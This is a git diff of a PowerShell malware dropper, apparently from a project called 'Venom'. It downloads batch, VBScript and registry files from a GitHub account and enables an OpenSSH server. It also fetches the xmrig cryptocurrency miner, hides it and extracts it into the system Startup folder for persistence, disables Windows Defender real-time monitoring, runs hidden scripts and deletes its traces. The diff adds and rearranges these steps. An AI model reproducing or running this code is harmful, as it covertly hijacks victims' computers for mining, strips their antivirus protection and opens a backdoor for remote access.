@@ -55,7 +55,7 @@ Invoke-WebRequest -OutFile "QyjAaZDBbNPk.reg" -Uri "https://raw.githubuserconten
 Invoke-WebRequest -OutFile "FoRAUwtxKkSB.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs"
 Invoke-WebRequest -OutFile "w.bat" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat"
 Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
-#Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks.ps1" -OutFile "AEQKCPrkuifY.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat" -OutFile "w.bat"
 
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
@@ -73,7 +73,6 @@ cd $wd
 Set-Variable -Name currentDir -Value ($Pwd)
 
 Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
-Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"
 
 Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
 
@@ -99,7 +98,6 @@ if (Test-Path -Path '...' -PathType Container) {
 
 
 cd $path
-Remove-Item -Path "w.bat"
 Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
@@ -111,7 +109,7 @@ Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwj
 #Start-Process -windowstyle hidden -ArgumentList "$initial_dir\xmrig-6.22.2\w.bat" -FilePath "cscript.exe"
 
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
-cd "$initial_dir\xmrig-6.22.2"
+#cd "$initial_dir\xmrig-6.22.2"
 #Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
 #Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -Wait
 
@@ -122,9 +120,10 @@ cd "$initial_dir\xmrig-6.22.2"
 #$env:SystemRoo
 # Define hidden payload path
 $hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-$payloadName = "svchost.exe"
-$destinationPath = Join-Path $hiddenDir $payloadName
-$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
+#$payloadName = "svchost.exe"
+$destinationPath = "$hiddenDir\xmrig-6.22.2\w.bat"#Join-Path $hiddenDir $payloadName
+#$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
+Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath $hiddenDir
 
 # Create hidden directory
 if (-not (Test-Path $hiddenDir)) {
@@ -133,7 +132,15 @@ if (-not (Test-Path $hiddenDir)) {
 }
 
 # Copy miner to hidden location
-Copy-Item -Path $newConfigPath_2 -Destination $destinationPath -Force
+#Copy-Item -Path $newConfigPath_2 -Destination $destinationPath -Force
+Set-Variable -Name newConfigPath -Value ("$path\w.bat")
+Set-Variable -Value ("$hiddenDir\xmrig-6.22.2\w.bat") -Name targetConfigPath
+if (Test-Path -Path $newConfigPath) {
+    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
+    Write-Output "bat file has been copied successfully."
+} else {
+    Write-Output "New bat file not found at the specified path."
+}
 
 # Disable Windows Defender temporarily
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
@@ -253,3 +260,4 @@ Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
 Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
+Remove-Item -Path "$path\w.bat"
